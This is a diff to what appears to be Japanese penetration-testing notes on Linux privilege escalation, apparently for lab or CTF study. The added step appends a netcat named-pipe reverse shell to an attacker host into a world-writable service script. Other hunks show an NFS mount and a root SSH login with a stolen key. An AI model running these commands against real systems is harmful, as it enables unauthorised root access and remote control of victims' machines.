@@ -492,7 +492,7 @@ ls -la <directory_full_path>
 ```zsh
 sudo su
 mkdir /tmp/nfs
-mount -o rw,vers=3 $target_IP:<writable_directory_full_path> /tmp/nfs
+mount -o rw,vers=3 <target_IP>:<writable_directory_full_path> /tmp/nfs
 ```
 
 3. ペイロードを生成し、マウントフォルダに保存する
@@ -824,8 +824,19 @@ ls -la <path_to_binary>
 ```
 - →誰でも書き換え可能
 
-3. [Pythonが使えない場合](../Common/What%20is%20the%20shell.md#🔁Pythonが使えない場合)のペイロードを用意し、サービスrestart
+3. [名前付きパイプを使ったnetcatリバースシェル](../Common/What%20is%20the%20shell.md#名前付きパイプを使ったnetcatリバースシェル)のペイロードを実行可能ファイルに追記する
+```zsh
+# ファイルが存在することを確認＆空白行を入れてペイロード注入による影響を減少
+echo >> <file.sh>
+```
+```zsh
+echo "mkfifo /tmp/f; nc <attacker_IP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <file.sh>
+```
+```zsh
+chmod +x <file.sh>
+```
 
+4. サービスrestart
 
 ---
 ---
@@ -1098,7 +1109,7 @@ cat <ssh_key>
 # 攻撃者マシン上でキーをコピーしたファイルを作成し、ターゲットにrootで接続
 echo '<ssh_key>' > ssh.key
 chmod 600 ssh.key
-ssh -i ssh.key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@$target_IP
+ssh -i ssh.key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@<target_IP>
 ```
 
 ---
